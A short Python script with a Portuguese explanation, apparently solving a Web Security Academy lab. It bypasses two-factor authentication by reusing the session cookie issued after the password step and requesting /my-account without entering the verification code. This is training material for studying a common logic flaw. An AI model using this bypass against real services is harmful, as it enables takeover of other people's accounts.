"""
A aplicação solicita inicialmente username e senha na página de login. 
Após o envio de credenciais válidas, o back-end cria uma sessão autenticada vinculado ao usuário 
e retorna um cookie associado a essa sessão (com isso o usuário já está "logado").
Em seguida, o usuário é redirecionado para uma outra página que solicita o código de verificação 2FA. 
Como já foi criada uma sessão autenticada no back-end para o usuário após o login inicial de username e senha,
a etapa de código de verificação não é efetivamente aplicada como requisito para acesso.
Dessa forma, mesmo sem fornecer o código de verificação, o usuário já consegue acessar diretamente os recursos 
de sua conta, apenas reutilizando o cookie obtido após login inicial.
"""

import requests

s = requests.Session()

url = 'https://0ac800c304ba81c7809d588900eb0096.web-security-academy.net'
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
data = {
    "username": "carlos",
    "password": "montoya"
}
response = s.post(url+"/login", data=data, headers=headers)

# Capturando o novo valor do cookie de sessão após entrar com as credenciais (username e senha) válidas 
session_valid = s.cookies.get("session")

cookies = {
    "session": session_valid
}
response = requests.get(url+"/my-account", cookies=cookies)

print(response.text)